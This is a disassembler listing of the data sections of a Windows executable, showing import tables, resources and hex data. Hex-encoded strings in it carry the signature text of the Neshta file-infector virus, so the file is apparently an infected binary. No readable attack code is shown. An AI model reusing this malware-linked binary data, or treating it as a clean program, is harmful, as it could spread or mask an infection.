                dd 3EBC3E92h, 3ECF3ECAh, 3EF83EE8h, 3F1A3F09h, 3F2B3F26h
                dd 3F373F30h, 3F483F3Eh, 3F6B3F5Fh, 3F8A3F78h, 3FA33F97h
                dd 3FC23FB0h, 3FE23FC8h, 3FF23FEAh, 3FFAh, 4000h, 110h
                dd 300A3002h, 303A3012h, 304A3042h, 305A3052h, 306A3062h
                dd 307A3072h, 308A3082h, 309A3092h, 30AA30A2h, 30BA30B2h
                dd 30CA30C2h, 30DA30D2h, 30EA30E2h, 30FA30F2h, 310A3102h
                dd 311A3112h, 312A3122h, 313A3132h, 314A3142h, 315A3152h
                dd 316A3162h, 317A3172h, 318A3182h, 31A73192h, 31C031B3h
                dd 31DF31D2h, 31F831EBh, 3217320Ah, 32303223h, 324A3242h
                dd 325F3252h, 3278326Bh, 3297328Ah, 32B032A3h, 32CF32C2h
                dd 32E832DBh, 330732FAh, 33203313h, 333F3332h, 3358334Bh
                dd 3377336Ah, 33903383h, 33AF33A2h, 33C833BBh, 33E733DAh
                dd 340033F3h, 34183412h, 34283424h, 3438342Ch, 3440343Ch
                dd 3450344Ch, 34603454h, 34683464h, 34783474h, 3488347Ch
                dd 3495348Ch, 356E34A1h, 3ACA39EDh, 3B1B3AF2h, 3C593C11h
                dd 3CD93C91h, 3D9E3D5Ah, 3E8D3DF9h, 3EEF3ED4h, 3FA83F1Bh
                dd 3FEAh, 5000h, 5Ch, 30623020h, 30E530B8h, 31B9315Dh
                dd 32493210h, 32B8327Fh, 33B8330Fh, 342033FCh, 34C0349Ch
                dd 351134E9h, 35DF35BBh, 367E35FCh, 385F368Dh, 39AE3948h
                dd 3B3A3B2Ch, 3B483B41h, 3B6F3B63h, 3B983B8Ah, 3BA63B9Fh
                dd 3C823BDDh, 3F9A3CA2h, 3FCA3FBCh, 6000h, 4Ch, 338C3015h
                dd 34CE3393h, 36B63582h, 3B283AF4h, 3B633B3Dh, 3C843BD8h
                dd 3CC23C8Dh, 3CF33CE7h, 3D033CFBh, 3D183D0Eh, 3D3A3D2Ah
                dd 3DEC3D5Ah, 3E413E1Eh, 3EA73E76h, 3EFD3EC3h, 3F4B3F10h
                dd 3FBA3F8Ch, 7000h, 98h, 30343009h, 30853052h, 30B730ABh
                dd 30D630C4h, 310230E5h, 31493119h, 31B23199h, 322D3218h
                dd 335F32C9h, 341B336Eh, 34D1346Fh, 357934DFh, 35C235AAh
                dd 362035D6h, 368C364Ah, 36EC36AFh, 37553707h, 37D63777h
                dd 38923875h, 395F390Ah, 39773964h, 39BB39B0h, 3A1B39D2h
                dd 3A453A2Eh, 3A7A3A63h, 3AEA3AB2h, 3B1A3B00h, 3B903B65h
                dd 3C083BADh, 3CA43C19h, 3D753D3Dh, 3E2E3DB8h, 3EA43E63h
                dd 3EF13EBEh, 3FC63F0Bh, 3FF1h, 8000h, 68h, 3033300Eh
                dd 30583046h, 3060305Ch, 30683064h, 3070306Ch, 30783074h
                dd 3080307Ch, 30883084h, 3090308Ch, 30983094h, 30A0309Ch
                dd 30A830A4h, 30B030ACh, 30B830B4h, 30C030BCh, 30C830C4h
                dd 30D030CCh, 30D830D4h, 30F930E0h, 31113106h, 31393125h
                dd 3161314Dh, 31CB319Dh, 320Eh, 9000h, 30h, 30343030h
                dd 30E83038h, 30F030ECh, 30F830F4h, 310030FCh, 31083104h
                dd 31183114h, 3120311Ch, 31283124h, 32143210h, 17000h
                dd 14h, 30043000h, 300C3008h, 0Fh dup(0)
                dd 33718935h, 0
                dd 30000h, 3, 80000028h, 0Ah, 80000040h, 0Eh, 80000060h
                dd 0
                dd 33718935h, 0
                dd 10000h, 1, 80000078h, 0
                dd 33718935h, 0
                dd 2, 80000118h, 80000090h, 80000126h, 800000A8h, 0
                dd 33718935h, 0
                dd 1, 8000013Eh, 800000C0h, 0
                dd 33718935h, 0
                dd 10000h, 419h, 0D8h, 0
                dd 33718935h, 0
                dd offset byte_10000, 0
                dd 0E8h, 0
                dd 33718935h, 0
                dd offset byte_10000, 0
                dd 0F8h, 0
                dd 33718935h, 0
                dd 10000h, 419h, 108h, 19150h, 10A8h, 2 dup(0)
                dd 1A1F8h, 10h, 2 dup(0)
                dd 1A208h, 0ACh, 2 dup(0)
                dd 1A2B4h, 14h, 2 dup(0)
                dd 440006h, 430056h, 41004Ch, 0B004Ch, 410050h, 4B0043h
                dd 470041h, 490045h, 46004Eh, 8004Fh, 41004Dh, 4E0049h
                dd 430049h, 4E004Fh, 42Ah dup(0)
                dd 384F3D26h, 0B83782C2h, 34224F3h, 833A9B17h, 0EC7554A9h
                dd 46287F07h, 0EB612F1Dh, 428AEDDEh, 0EF9AB79Ah, 9B5A1B6Ah
                dd 52F5CB22h, 5A4C5A73h, 7321E9D8h, 0CA063697h, 9FEF1413h
                dd 9DC87B6Eh, 0AF63305Dh, 74ED2749h, 0EAD99E94h, 953C83F6h
                dd 88FEFD0Eh, 21613D95h, 6895EEF7h, 4E9AE416h, 537CE082h
                dd 36A9888Bh, 0CF0FF3D2h, 2F175D4Bh, 88D1E4D4h, 0B6CB71E2h
                dd 387111CFh, 0F1F47AD5h, 341182CEh, 0B337A730h, 7DE20FDFh
                dd 1A378BE8h, 631B8C18h, 0BC701412h, 0B82B0B6Eh, 61558FDBh
                dd 964E2567h, 4FC9C763h, 0AD68628Bh, 25E52559h, 2E34A6B3h
                dd 470CEB6Bh, 0BEAC20h, 10000h, 20200001h, 10000h, 10A80020h
                dd 10000h, 6 dup(0)
                dd 706C6544h, 742D6968h, 62206568h, 2E747365h, 63754620h
                dd 666F206Bh, 6C612066h, 6874206Ch, 65722065h, 202E7473h
                dd 6873654Eh, 31206174h, 4D20302Eh, 20656461h, 42206E69h
                dd 72616C65h, 202E7375h, 0E2FBF0CFh, 0EDE0F269h, 0F320E5EDh
                dd 20EC69F1h, 0EA69F67Eh, 0ECFBE2E0h, 0E5E1207Eh, 0F3F0E0EBh
                dd 69EA5FF1h, 0E7E420ECh, 0E0F7F3FFh, 2EECE0F2h, 0FFEBC020h
                dd 0EDE0F1EAh, 0D020F0E4h, 0F0EEE3FBh, 0F769E2E0h, 0E0E2202Ch
                dd 0E0F220ECh, 0ECE0F1EAh, 293A20E0h, 0F1EEC220h, 20FCEDE5h
                dd 0E5EA202Dh, 0E0EAF1EFh, 0E0EF20FFh, 2E2EE0F0h, 0EBC0202Eh
                dd 0F0E0E269h, 2D20FFFBh, 0EFE5EB20h, 20E5E0F8h, 0E0E269EFh
aBestRegards2To db '! Best regards 2 Tommy Salo. [Nov-2005] yours [Dziadulja Apanas]',0
                align 4
                dd 7 dup(0)
                dd 0BB36h, 12ACh, 0B0B8h, 2 dup(0)
                dd 0BB70h, 1280h, 5 dup(0)
                dd offset word_B11E, offset word_B12E, offset dword_B110
                dd 0
                dd 8000003Dh, 80000040h, 8000003Ah, 80000038h, 80000044h
                dd 80000043h, 80000017h, 80000031h, 80000014h, 80000011h
                dd 80000020h, 8000001Fh, 0
                dd offset aNfo, offset word_B29A, offset word_B2A6, offset dword_B2BC ; "ception@ATL@@" ...
                dd offset dword_B2C4, offset word_B2D2, offset word_B2DE
                dd offset word_B2EE, offset dword_B304, offset dword_B318
                dd offset word_B32A, offset dword_B338, offset dword_B34C
                dd offset word_B362, offset dword_B370, offset dword_BB94
                dd offset dword_BB88, offset word_BB7A, offset dword_BA40
                dd offset dword_BA2C, offset dword_BA18, offset word_BA06
                dd offset dword_B9F0, offset dword_B9DC, offset word_B9CE
                dd offset word_B9BE, offset word_B9AE, offset word_B9A2
                dd offset word_B996, offset dword_B988, offset word_B25A
                dd offset dword_B960, offset dword_B950, offset word_B93E
                dd offset word_B92A, offset word_B91A, offset word_B90E
                dd offset word_B8FE, offset dword_B8F0, offset word_B8DE
                dd offset dword_B8CC, offset word_B8BA, offset word_B8AA
                dd offset word_B896, offset dword_B880, offset dword_B874
                dd offset word_B85E, offset word_B842, offset word_B832
                dd offset dword_B820, offset dword_B810, offset dword_B800
                dd offset word_B7E6, offset word_B7D6, offset dword_B7BC
                dd offset dword_B7A8, offset dword_B78C, offset dword_B77C
                dd offset dword_B76C, offset word_B75A, offset dword_B73C
                dd offset aCeptionAtl, offset word_B22A, offset word_B20E
                dd offset word_B1FE, offset dword_B1E8, offset dword_B1D8
                dd offset word_B1BA, offset dword_B1A8, offset word_B192
                dd offset dword_B180, offset dword_B168, offset dword_B150
                dd offset dword_B978, offset word_B726, offset word_BBA6
                dd 0
                dd offset word_BAD6, offset dword_BABC, offset word_BAA2
                dd 0
; ---------------------------------------------------------------------------
                retf    0B4h
; ---------------------------------------------------------------------------
                align 4
                dd offset dword_B4C0, offset word_B4AA, offset dword_B494 ; "GISTR" ...
                dd offset word_B486, offset dword_B47C, offset dword_B4D4
                dd offset word_B466, offset word_B456, offset word_B446
                dd offset word_B43E, offset word_B42E, offset word_B422
                dd offset word_B412, offset word_B4DE, offset dword_B4EC
                dd offset word_B4FE, offset dword_B508, offset dword_B510
                dd offset word_B51E, offset word_B526, offset dword_B530
                dd offset dword_B53C, offset word_B54A, offset dword_B560
                dd offset dword_B574, offset dword_BA54, offset word_BA62
                dd offset word_BA72, offset word_BA82, offset word_BA92
                dd offset off_B580, offset word_B58A, offset word_B5AA
                dd offset word_B5BE, offset dword_B5C8, offset word_B5D6
                dd offset aRegistr+6, offset aYTypelib, offset word_B5FE
                dd offset dword_B618, offset word_B62A, offset word_B63A
                dd offset dword_B470, 0
                dd 800000BAh, 80000004h, 80000006h, 80000007h, 800000A1h
                dd 800000A2h, 800000A3h, 80000021h, 8000000Fh, 80000010h
                dd 80000013h, 80000014h, 80000015h, 80000018h, 80000017h
                dd 80000016h, 0
                dd offset dword_BB58, offset word_BB42, 0
                dd offset word_B3DE, offset dword_B3C8, offset dword_B3EC
                dd offset dword_B3A0, offset dword_B3B4, offset dword_B3F8
                dd offset word_B392, 0
                dd offset word_BB0E, offset dword_BB24, 0
                dd offset dword_B6A0, offset dword_B6B8, offset dword_B6D0
                dd offset word_B6EA, offset word_B6FE, offset dword_B67C
                dd offset word_B68E, 0
                db  30h ; 0
                db 2, 52h, 65h
aGclosekey      db 'gCloseKey',0
                dw 261h
aRegopenkeyexw  db 'RegOpenKeyExW',0
                dw 26Eh
aRegqueryvaluee_0 db 'RegQueryValueExW',0
                align 2
aAdvapi32Dll    db 'ADVAPI32.dll',0
                align 10h
                db 0EFh
                db 2, 49h, 6Eh
aTerlockedincre db 'terlockedIncrement',0
                align 4
                db 0EBh
                db 2, 49h, 6Eh
aTerlockeddecre db 'terlockedDecrement',0
                align 10h
                dd 65470245h, 6F725074h, 64644163h, 73736572h, 2D30000h
aHeapsetinforma db 'HeapSetInformation',0
                align 4
                dd 615203B1h, 45657369h, 70656378h, 6E6F6974h, 4A50000h
aSetunhandledex db 'SetUnhandledExceptionFilter',0
                db 0B5h
                align 2
aCreatethread   db 'CreateThread',0
                align 4
                db 0C5h
                db 1, 47h, 65h
aTcurrentthread db 'tCurrentThreadId',0
                align 2
                dw 202h
aGetlasterror_0 db 'GetLastError',0
                align 2
                dw 2E2h
aInitializecrit_0 db 'InitializeCriticalSection',0
                dw 0EEh
aEntercriticals_0 db 'EnterCriticalSection',0
                align 2
                dw 339h
aLeavecriticals_0 db 'LeaveCriticalSection',0
                align 2
                dw 2E3h
aInitializecrit_1 db 'InitializeCriticalSectionAndSpinCount',0
                dw 0D1h
aDeletecritical_0 db 'DeleteCriticalSection',0
                dw 459h
aSetevent       db 'SetEvent',0
                align 2
                dw 4F9h
aWaitforsingleo db 'WaitForSingleObject',0
                dd 6C5304B2h, 706565h, 6C430052h, 4865736Fh, 6C646E61h
                dd 54E0065h, 7274736Ch, 576E656Ch, 850000h, 61657243h
                dd 76456574h, 57746E65h, 2140000h
aGetmodulefilen_0 db 'GetModuleFileNameW',0
                align 4
                db  18h
                db 2, 47h, 65h
aTmodulehandlew db 'tModuleHandleW',0
                align 4
                db  87h
                db 1, 47h, 65h
aTcommandlinew  db 'tCommandLineW',0
                dw 8Fh
aCreatefilew    db 'CreateFileW',0
                db 0C0h
                db 1, 47h, 65h
aTcurrentproces db 'tCurrentProcess',0
                db 0C1h
                db 1, 47h, 65h
aTcurrentproces_0 db 'tCurrentProcessId',0
                dw 119h
aExitprocess    db 'ExitProcess',0
                db 0C0h
                db 4, 54h, 65h
aRminateprocess db 'rminateProcess',0
                align 4
aKernel32Dll_2  db 'KERNEL32.dll',0
                align 2
                dw 15Eh
aGetmessagew    db 'GetMessageW',0
                db    1
                db 3, 54h, 72h
aAnslatemessage db 'anslateMessage',0
                align 4
                db 0AFh
                align 2
aDispatchmessag db 'DispatchMessageW',0
                align 4
                db  3Ch ; <
                db 2, 50h, 6Fh
aStthreadmessag db 'stThreadMessageW',0
                align 2
                db '<',0
aCharupperw     db 'CharUpperW',0
                align 4
a1              db '1',0
aCharnextw      db 'CharNextW',0
                db  17h
                db 2, 4Dh, 65h
aSsageboxw      db 'ssageBoxW',0
aUser32Dll_0    db 'USER32.dll',0
                align 2
aE              db 'e',0
a3YaxpaxZ       db '??3@YAXPAX@Z',0
                align 2
                dw 3D8h
aPurecall       db '_purecall',0
aC              db 'c',0
a2YapaxiZ       db '??2@YAPAXI@Z',0
                align 2
                dw 58Bh
aFree           db 'free',0
                align 2
                db 'x',0
aUYapaxiZ       db '??_U@YAPAXI@Z',0
aZ              db 'z',0
aVYaxpaxZ       db '??_V@YAXPAX@Z',0
                dw 63Ah
aWcsncmp        db 'wcsncmp',0
                db  3Ch ; <
                db 6, 77h, 63h
aSncpyS         db 'sncpy_s',0
                db  43h ; C
                db 6, 77h, 63h
aSstr           db 'sstr',0
                align 2
                dw 611h
aSwprintfS      db 'swprintf_s',0
                align 4
                db  21h ; !
                db 1, 5Fh, 43h
aXxthrowexcepti db 'xxThrowException',0
                align 2
                dw 13Ah
aCxxframehandle db '__CxxFrameHandler3',0
                align 10h
                dd 656D05CEh, 706D636Dh, 5D30000h, 736D656Dh, 7465h, 656D05CFh
                dd 7970636Dh, 1C50000h, 736D615Fh, 78655F67h, 7469h, 5F5F01B6h
                dd 74656777h, 6E69616Dh, 73677261h, 1DC0000h, 7865635Fh
                dd 7469h, 655F022Ah, 746978h, 585F012Dh, 46747063h, 65746C69h
                dd 5730072h, 74697865h, 4D10000h, 6D63775Fh, 6E6C64h, 695F02B0h
                dd 7474696Eh, 6D7265h, 695F02B1h, 7474696Eh, 5F6D7265h
                dd 1EC0065h
aConfigthreadlo db '_configthreadlocale',0
                dd 5F5F01A2h, 75746573h, 6D726573h, 65687461h, 7272h, 635F01EBh
                dd 6F6D6D6Fh, 6564h, 665F0245h, 65646F6Dh, 19F0000h, 65735F5Fh
                dd 70615F74h, 79745F70h, 6570h, 4356534Dh, 30303152h, 6C6C642Eh
                dd 1020000h
aTerminateYaxxz db '?terminate@@YAXXZ',0
                dw 48Dh
aUnlock         db '_unlock',0
                db  5Bh ; [
                db 1, 2 dup(5Fh)
aDllonexit      db 'dllonexit',0
                dw 323h
aLock           db '_lock',0
                dw 3C9h
aOnexit         db '_onexit',0
                db 0FBh
                db 1, 5Fh, 63h
aRtDebuggerHook db 'rt_debugger_hook',0
                align 2
                dw 221h
aExceptHandler4 db '_except_handler4_common',0
                dd 695F02B8h, 6B6F766Eh, 61775F65h, 6E6F7374h, 1EF0000h
                dd 6E6F635Fh, 6C6F7274h, 735F7066h, 0EE0000h
aTypeInfoDtorIn db '?_type_info_dtor_internal_method@type_info@@QAEXXZ',0
                align 10h
aAtl100Dll      db 'ATL100.DLL',0
                align 4
                db 'l',0
aCouninitialize db 'CoUninitialize',0
                align 2
                db '?',0
aCoinitializeex db 'CoInitializeEx',0
                align 10h
                db '\',0
aCoresumeclasso db 'CoResumeClassObjects',0
                align 4
                db 9,0
aCoaddrefserver db 'CoAddRefServerProcess',0
                db '[',0
aCoreleaseserve db 'CoReleaseServerProcess',0
                align 2
                dw 10h
aCocreateinstan db 'CoCreateInstance',0
                align 2
                dw 0CDh
aIidfromstring  db 'IIDFromString',0
aOle32Dll       db 'ole32.dll',0
aOleaut32Dll_0  db 'OLEAUT32.dll',0
                align 2
                dw 2ECh
aInterlockedexc db 'InterlockedExchange',0
                db 0E9h
                db 2, 49h, 6Eh
aTerlockedcompa db 'terlockedCompareExchange',0
                align 2
                dw 263h
aGetstartupinfo db 'GetStartupInfoW',0
                db 0EAh
                align 2
aEncodepointer  db 'EncodePointer',0
                db 0CAh
                align 2
aDecodepointer  db 'DecodePointer',0
                db 0D3h
                db 4, 55h, 6Eh
aHandledexcepti db 'handledExceptionFilter',0
                align 4
                db    0
                db 3, 49h, 73h
aDebuggerpresen db 'DebuggerPresent',0
                db 0A7h
                db 3, 51h, 75h
aEryperformance db 'eryPerformanceCounter',0
                dw 293h
aGettickcount   db 'GetTickCount',0
                align 2
                dw 279h
aGetsystemtimea db 'GetSystemTimeAsFileTime',0
                dd 6F4C0354h, 65526B63h, 72756F73h, 6563h, 6F4C0341h, 65526461h
                dd 72756F73h, 6563h, 695304B1h, 666F657Ah, 6F736552h, 65637275h
                dd 14E0000h, 646E6946h, 6F736552h, 65637275h, 29E0057h
aGetuserdefault db 'GetUserDefaultUILanguage',0
                align 2
                dw 2BFh
aGlobalmemoryst db 'GlobalMemoryStatus',0
                align 4
                db  25h ; %
                db 5, 57h, 72h
aItefile        db 'iteFile',0
                db  25h ; %
                db 2, 47h, 65h
aTnativesystemi db 'tNativeSystemInfo',0
                dw 283h
aGettempfilenam db 'GetTempFileNameW',0
                align 2
                dw 2A4h
aGetversionexw  db 'GetVersionExW',0
                dw 30Eh
aIswow64process db 'IsWow64Process',0
                align 4
                db  97h
                db 2, 47h, 65h
aTtimeformatw   db 'tTimeFormatW',0
                align 2
                dw 1C8h
aGetdateformatw db 'GetDateFormatW',0
                align 10h
                db  62h ; b
                db 1, 46h, 72h
aEelibrary      db 'eeLibrary',0
                dw 473h
aSetlasterror   db 'SetLastError',0
                align 2
                dw 12Eh
aFindclose      db 'FindClose',0
                dw 33Fh
aLoadlibraryw   db 'LoadLibraryW',0
                align 2
                dw 1FBh
aGetfullpathnam db 'GetFullPathNameW',0
                align 2
                dw 139h
aFindfirstfilew db 'FindFirstFileW',0
                align 10h
                db 0FAh
                db 3, 52h, 65h
aLeasemutex     db 'leaseMutex',0
                align 10h
                db  70h ; p
                db 4, 53h, 65h
aThandleinforma db 'tHandleInformation',0
                align 4
                db  9Eh
                align 2
aCreatemutexw   db 'CreateMutexW',0
                align 4
                db 0CEh
                db 2, 48h, 65h
aApdestroy      db 'apDestroy',0
; ---------------------------------------------------------------------------
                retf
; ---------------------------------------------------------------------------
                db 2
aHeapalloc      db 'HeapAlloc',0
                dw 2CFh
aHeapfree       db 'HeapFree',0
                align 2
                dw 273h
aGetsysteminfo  db 'GetSystemInfo',0
                dw 4F1h
aVirtualquery   db 'VirtualQuery',0
                align 2
                dw 2CDh
aHeapcreate     db 'HeapCreate',0
                align 4
                retn
; ---------------------------------------------------------------------------
                db 3, 52h, 65h
aAdprocessmemor db 'adProcessMemory',0
                db 0DFh
                db 1, 47h, 65h
aTexitcodeproce db 'tExitCodeProcess',0
                align 2
                dw 0A8h
aCreateprocessw db 'CreateProcessW',0
                align 4
                db  99h
                db 4, 53h, 65h
aTthreadpriorit db 'tThreadPriority',0
                db  8Eh
                db 2, 47h, 65h
aTthreadpriorit_0 db 'tThreadPriority',0
                dd 654701C4h, 72754374h, 746E6572h, 65726854h, 6461h, 765F04B7h
                dd 70776E73h, 746E6972h, 3E60066h, 7365725Fh, 74737465h
                dd 6C666F6Bh, 4B80077h, 6E73765Fh, 69727077h, 5F66746Eh
                dd 51F006Ch, 616D775Fh, 6170656Bh, 735F6874h, 5410000h
                dd 7073775Fh, 7074696Ch, 5F687461h, 600073h
a0LockitStdQaeH db '??0_Lockit@std@@QAE@H@Z',0
                db  9Eh
                align 2
a1LockitStdQaeX db '??1_Lockit@std@@QAE@XZ',0
                align 2
                dw 19Eh
aDecrefFacetLoc db '?_Decref@facet@locale@std@@QAEPAV123@XZ',0
aMsvcp100Dll    db 'MSVCP100.dll',0
                align 2
                dw 6
aGetfileversion db 'GetFileVersionInfoW',0
                dd 6556000Eh, 65755172h, 61567972h, 5765756Ch, 45560000h
                dd 4F495352h, 6C642E4Eh, 4006Ch
aEnumprocessmod db 'EnumProcessModules',0
                align 4
                db  10h
                align 2
aGetmodulefilen_1 db 'GetModuleFileNameExW',0
                align 10h
aPsapiDll       db 'PSAPI.DLL',0
                dw 2D2h
aHeaprealloc    db 'HeapReAlloc',0
                dd 654802D4h, 69537061h, 657Ah, 6547024Ah, 6F725074h, 73736563h
                dd 70616548h, 4EC0000h, 74726956h, 466C6175h, 656572h
                dd 4 dup(0)
                dd 4F35E2B2h, 0
                db  10h
                db 0BCh, 2 dup(0)
                db    1
                align 4
                db    4
                align 4
                db    4
                align 4
                db 0E8h
                db 0BBh, 2 dup(0)
                db 0F8h
                db 0BBh, 2 dup(0)
                db    8
                db 0BCh, 2 dup(0)
                db 0D0h
                db 0A4h, 2 dup(0)
                db 0E0h
                db 0A4h, 2 dup(0)
                db  10h
                db 42h, 2 dup(0)
                db  26h ; &
                db 42h, 2 dup(0)
                db  21h ; !
                db 0BCh, 2 dup(0)
                db  34h ; 4
                db 0BCh, 2 dup(0)
                db  49h ; I
                db 0BCh, 2 dup(0)
                db  57h ; W
                db 0BCh, 2 dup(0)
                db    0
                align 2
                dw 1
                db    2
                align 2
                dw 3
aDtsdebughostEx db 'DtsDebugHost.exe',0
aDmpgetclientex db 'DmpGetClientExport',0
aDmpremotedumpr db 'DmpRemoteDumpRequest',0
aSsisbegindump  db 'SSISBeginDump',0
aSsisgetextradu db 'SSISGetExtraDumpFileHandle',0
                align 4
                dd 27h dup(0)
dword_B110      dd 3 dup(0)             ; DATA XREF: CODE:0000A238↑o
                                        ; CODE:00011C58↓o
                db 2 dup(0)
word_B11E       dw 0                    ; DATA XREF: CODE:0000A238↑o
                                        ; CODE:00011C58↓o
                dd 3 dup(0)
                db 2 dup(0)
word_B12E       dw 0                    ; DATA XREF: CODE:0000A238↑o
                                        ; CODE:00011C58↓o
                dd 8 dup(0)
dword_B150      dd 6 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
dword_B168      dd 6 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
dword_B180      dd 4 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                db 2 dup(0)
word_B192       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 5 dup(0)
dword_B1A8      dd 4 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                db 2 dup(0)
word_B1BA       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 7 dup(0)
dword_B1D8      dd 4 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
dword_B1E8      dd 5 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                db 2 dup(0)
word_B1FE       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 100135Ch, 1002BBBh, 1002AB5h
                db 6Ah, 2Bh
word_B20E       dw 100h                 ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 2 dup(0)
                dd 1002BB3h, 1002BABh, 1002BA3h, 100136Ch
                db 28h, 4
word_B22A       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 424h, 10017BCh, 0
                dd 56413F2Eh, 6C744143h
                db 45h, 78h
aCeptionAtl     db 'ception@ATL@@',0    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 100132Ch, 100133Ch
                db 1, 0
word_B25A       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 4 dup(0)
                dd 100132Ch, 10017BCh, 0
                dd 56413F2Eh, 65707974h
                db 5Fh, 69h
aNfo            db 'nfo@@',0            ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0BB40E64Eh, 44BF19B1h, 2 dup(0FFFFFFFFh)
                db 2 dup(0)
word_B29A       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                align 10h
                dd 0FFFFFFFEh
                db 1, 0
word_B2A6       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 100136Ch, 1001810h, 1001800h, 2 dup(0)
dword_B2BC      dd 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 1002960h
dword_B2C4      dd 100C74Ch, 100C0C0h, 0
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 2 dup(0)
word_B2D2       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 2, 0
                db 2 dup(0)
word_B2DE       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 3 dup(0)
                db 2 dup(0)
word_B2EE       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 5 dup(0)
dword_B304      dd 5 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B318      dd 4 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 2 dup(0)
word_B32A       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 3 dup(0)
dword_B338      dd 5 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B34C      dd 5 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 2 dup(0)
word_B362       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                align 10h
dword_B370      dd 8 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 2 dup(0)
word_B392       dw 0                    ; DATA XREF: CODE:0000A4C4↑o
                                        ; CODE:00011EE4↓o
                align 10h
dword_B3A0      dd 5 dup(0)             ; DATA XREF: CODE:0000A4C4↑o
                                        ; CODE:00011EE4↓o
dword_B3B4      dd 5 dup(0)             ; DATA XREF: CODE:0000A4C4↑o
                                        ; CODE:00011EE4↓o
dword_B3C8      dd 5 dup(0)             ; DATA XREF: CODE:0000A4C4↑o
                                        ; CODE:00011EE4↓o
                db 2 dup(0)
word_B3DE       dw 0                    ; DATA XREF: CODE:0000A4C4↑o
                                        ; CODE:00011EE4↓o
                dd 3 dup(0)
dword_B3EC      dd 3 dup(0)             ; DATA XREF: CODE:0000A4C4↑o
                                        ; CODE:00011EE4↓o
dword_B3F8      dd 4 dup(0)             ; DATA XREF: CODE:0000A4C4↑o
                                        ; CODE:00011EE4↓o
                dd 4, 30002h
                db 0D8h, 1
word_B412       dw 8000h                ; DATA XREF: CODE:0000A3C4↑o
                dd 80000038h, 800001EAh, 80000060h
                db 6, 0
word_B422       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 80000078h, 10h
                db 90h
                align 2
word_B42E       dw 8000h                ; DATA XREF: CODE:0000A3C4↑o
                dd 18h, 800000A8h, 0
                db 2 dup(0)
word_B43E       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 4
                db 2 dup(0)
word_B446       dw 3                    ; DATA XREF: CODE:0000A3C4↑o
                dd 65h, 800000C0h, 66h
                db 0D8h, 0
word_B456       dw 8000h                ; DATA XREF: CODE:0000A3C4↑o
                dd 67h, 800000F0h, 0
                db 2 dup(0)
word_B466       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 4, 10000h
dword_B470      dd 1, 80000108h, 0      ; DATA XREF: CODE:0000A3C4↑o
                                        ; CODE:00011E78↓o
dword_B47C      dd 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 4
                db 2 dup(0)
word_B486       dw 1                    ; DATA XREF: CODE:0000A3C4↑o
                dd 7, 80000120h, 0
dword_B494      dd 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 4, 10000h, 1, 80000138h
                db 2 dup(0)
word_B4AA       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                align 10h
                dd 4, 10000h, 1, 80000150h
dword_B4C0      dd 2 dup(0)             ; DATA XREF: CODE:0000A3C4↑o
                dd 4, 10000h, 409h
dword_B4D4      dd 168h, 0              ; DATA XREF: CODE:0000A3C4↑o
                db 2 dup(0)
word_B4DE       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 4, 10000h, 409h
dword_B4EC      dd 178h, 2 dup(0)       ; DATA XREF: CODE:0000A3C4↑o
                dd 4
                db 2 dup(0)
word_B4FE       dw 1                    ; DATA XREF: CODE:0000A3C4↑o
                dd 409h, 188h
dword_B508      dd 2 dup(0)             ; DATA XREF: CODE:0000A3C4↑o
dword_B510      dd 4, 10000h, 409h      ; DATA XREF: CODE:0000A3C4↑o
                db 98h, 1
word_B51E       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 0
                db 2 dup(0)
word_B526       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 4, 10000h
dword_B530      dd 409h, 1A8h, 0        ; DATA XREF: CODE:0000A3C4↑o
dword_B53C      dd 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 4, 10000h
                db 9, 4
